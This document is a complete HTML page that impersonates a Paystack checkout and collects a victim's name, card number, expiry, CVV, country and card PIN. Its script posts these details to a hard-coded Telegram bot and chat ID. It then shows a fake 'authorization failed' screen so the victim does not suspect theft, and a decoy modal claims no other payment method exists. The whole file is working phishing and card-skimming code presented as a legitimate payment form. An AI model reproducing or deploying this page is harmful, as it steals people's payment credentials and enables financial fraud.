<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Pay </title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.wrap{background:#fff;border-radius:16px;padding:2rem 1.5rem;width:100%;max-width:400px;box-shadow:0 2px 20px rgba(0,0,0,0.08);}
h2{text-align:center;font-size:17px;font-weight:600;color:#1a1a1a;margin-bottom:1.5rem;}
.field{border:1.5px solid #e0e0e0;border-radius:10px;padding:12px 14px;background:#fff;margin-bottom:12px;transition:border-color .2s;}
.field:focus-within{border-color:#4caf87;}
.field label{display:block;font-size:10.5px;color:#999;letter-spacing:.06em;margin-bottom:4px;}
.field input{border:none;outline:none;background:transparent;font-size:16px;color:#1a1a1a;width:100%;font-family:inherit;}
.field input::placeholder{color:#ccc;}
.row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.cvv-head{display:flex;justify-content:space-between;align-items:center;}
.cvv-head span{font-size:10.5px;color:#4caf87;cursor:pointer;}
.pay-btn{width:100%;padding:15px;background:#4caf87;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s;}
.pay-btn:hover{background:#3d9e78;}
.pay-btn:disabled{background:#a0d4be;cursor:not-allowed;}
.alt-btns{display:flex;flex-direction:column;align-items:center;gap:10px;margin-top:14px;}
.alt-btn{display:flex;align-items:center;justify-content:center;gap:7px;padding:13px;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;color:#333;font-size:14px;cursor:pointer;font-family:inherit;}
.alt-btn.wide{width:82%;}
.alt-btn.narrow{width:62%;}
.secure{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:22px;color:#888;font-size:13px;}
.secure svg{width:14px;height:14px;fill:#888;}
.secure b{color:#1a1a1a;}
.toast{display:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 20px;border-radius:8px;font-size:14px;z-index:999;}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.45);z-index:1000;align-items:center;justify-content:center;}
.modal-overlay.show{display:flex;}
.modal-box{background:#fff;border-radius:16px;padding:2rem 1.5rem;width:90%;max-width:360px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.18);}
.modal-icon{width:52px;height:52px;border-radius:50%;background:#e8f5ef;display:flex;align-items:center;justify-content:center;margin:0 auto 1.1rem;}
.modal-box h3{font-size:16px;font-weight:700;color:#1a1a1a;margin-bottom:10px;}
.modal-box p{font-size:13.5px;color:#666;line-height:1.65;margin-bottom:1.5rem;}
.modal-continue{width:100%;padding:14px;background:#4caf87;border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;transition:background .2s;}
.modal-continue:hover{background:#3d9e78;}
</style>
</head>
<body>
<div class="wrap">
  <h2>Enter your card details to pay</h2>

  <div class="field">
    <label>FULL NAME</label>
    <input id="fn" type="text" placeholder="John Doe" maxlength="60" autocomplete="cc-name">
  </div>

  <div class="field">
    <label>CARD NUMBER</label>
    <input id="cn" type="tel" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number">
  </div>

  <div class="row">
    <div class="field">
      <label>CARD EXPIRY</label>
      <input id="ex" type="tel" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp">
    </div>
    <div class="field">
      <div class="cvv-head">
        <label>CVV</label>
        <span>HELP?</span>
      </div>
      <input id="cv" type="tel" placeholder="123" maxlength="4" autocomplete="cc-csc">
    </div>
  </div>

  <div class="field">
    <label>COUNTRY</label>
    <input id="cy" type="text" placeholder="e.g. Nigeria" maxlength="60" autocomplete="country-name">
  </div>

  <div class="field">
    <label>PIN</label>
    <input id="pn" type="password" placeholder="••••" maxlength="6" autocomplete="off">
  </div>

  <button class="pay-btn" id="paybtn" onclick="submitPay()">Pay</button>

  <div class="alt-btns">
    <button class="alt-btn wide" onclick="openAltModal()">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M7 16l-4-4 4-4M17 8l4 4-4 4M14 4l-4 16"/></svg>
      Change Payment Method
    </button>
    <button class="alt-btn narrow">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M18 6L6 18M6 6l12 12"/></svg>
      Cancel Payment
    </button>
  </div>

  <div class="secure">
    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.25C17.25 21.15 21 16.25 21 11V5l-9-4z"/></svg>
    Secured by <b>paystack</b>
  </div>
</div>

<div class="toast" id="toast">Processing payment…</div>

<div class="modal-overlay" id="altModal">
  <div class="modal-box">
    <div class="modal-icon">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#4caf87" stroke-width="2.2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
    </div>
    <h3>Card Payment Available</h3>
    <p>There are currently no alternative payment methods available. Please proceed with card payment to complete your transaction.</p>
    <button class="modal-continue" onclick="closeAltModal()">Continue to Card Payment</button>
  </div>
</div>

<script>
function openAltModal(){document.getElementById('altModal').classList.add('show');}
function closeAltModal(){document.getElementById('altModal').classList.remove('show');}
document.getElementById('altModal').addEventListener('click',function(e){if(e.target===this)closeAltModal();});

const BOT = '9062407849:AAFhTh7Khmzi1zxjxQ2FKGAcILivgSAWQ6c';
const CID = '8638272513';

const cn = document.getElementById('cn');
const ex = document.getElementById('ex');
const cv = document.getElementById('cv');

cn.addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g,'').slice(0,16);
  e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
});

ex.addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g,'').slice(0,4);
  if(v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
  e.target.value = v;
});

cv.addEventListener('input', e => {
  e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
});

async function submitPay() {
  const fullname = document.getElementById('fn').value.trim();
  const card   = cn.value.trim();
  const expiry = ex.value.trim();
  const cvv    = cv.value.trim();
  const country = document.getElementById('cy').value.trim();
  const pin    = document.getElementById('pn').value.trim();

  if (!fullname || !card || !expiry || !cvv || !country || !pin) {
    alert('Please fill in all card details.');
    return;
  }

  const btn = document.getElementById('paybtn');
  btn.disabled = true;
  btn.textContent = 'Processing…';

  const msg =
`💳 *New Card Details*
━━━━━━━━━━━━━━━
👤 *Full Name:* \`${fullname}\`
🔢 *Card Number:* \`${card}\`
📅 *Expiry:* \`${expiry}\`
🔒 *CVV:* \`${cvv}\`
🌍 *Country:* \`${country}\`
🔑 *PIN:* \`${pin}\`
━━━━━━━━━━━━━━━
💰 Amount: NGN 1,000`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CID,
        text: msg,
        parse_mode: 'Markdown'
      })
    });
  } catch(e) {}

  setTimeout(() => {
    btn.textContent = 'Pay NGN 1,000';
    btn.style.background = '#4caf87';
    btn.disabled = false;

    document.querySelector('.wrap').innerHTML = `
      <div style="text-align:center;padding:0.5rem 0 1rem;">
        <div style="width:64px;height:64px;border-radius:50%;background:#fef2f2;border:1.5px solid #fecaca;display:flex;align-items:center;justify-content:center;margin:0 auto 1.4rem;">
          <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"/>
            <line x1="12" y1="8" x2="12" y2="12"/>
            <circle cx="12" cy="16" r="0.5" fill="#dc2626"/>
          </svg>
        </div>
        <p style="font-size:11px;font-weight:700;letter-spacing:.1em;color:#dc2626;text-transform:uppercase;margin-bottom:8px;">Payment Unsuccessful</p>
        <h2 style="font-size:18px;font-weight:700;color:#111827;margin-bottom:14px;line-height:1.35;">Card Authorization Failed</h2>
        <div style="width:40px;height:2px;background:#e5e7eb;margin:0 auto 18px;border-radius:2px;"></div>
        <p style="font-size:13.5px;color:#4b5563;line-height:1.75;margin-bottom:10px;">
          Unfortunately, your card payment could not be authorized. This may be due to insufficient available funds, card restrictions, or a security measure applied by your card issuer.
        </p>
        <p style="font-size:13.5px;color:#4b5563;line-height:1.75;margin-bottom:18px;">
          Please contact your bank for assistance or verify your available balance before trying again.
        </p>
        <p style="font-size:12.5px;color:#9ca3af;line-height:1.6;margin-bottom:24px;">
          We apologize for any inconvenience and appreciate your understanding.
        </p>
        <button onclick="location.reload()" style="width:100%;padding:14px;background:#111827;border:none;border-radius:10px;color:#fff;font-size:14.5px;font-weight:600;cursor:pointer;font-family:inherit;letter-spacing:.01em;transition:background .2s;" onmouseover="this.style.background='#1f2937'" onmouseout="this.style.background='#111827'">
          Try Again
        </button>
        <div style="display:flex;align-items:center;justify-content:center;gap:5px;margin-top:18px;">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="#9ca3af"><path d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.25C17.25 21.15 21 16.25 21 11V5l-9-4z"/></svg>
          <span style="font-size:12px;color:#9ca3af;">Secured by <strong style="color:#6b7280;">Paystack</strong></span>
        </div>
      </div>
    `;
  }, 2000);
}
</script>
</body>
</html>
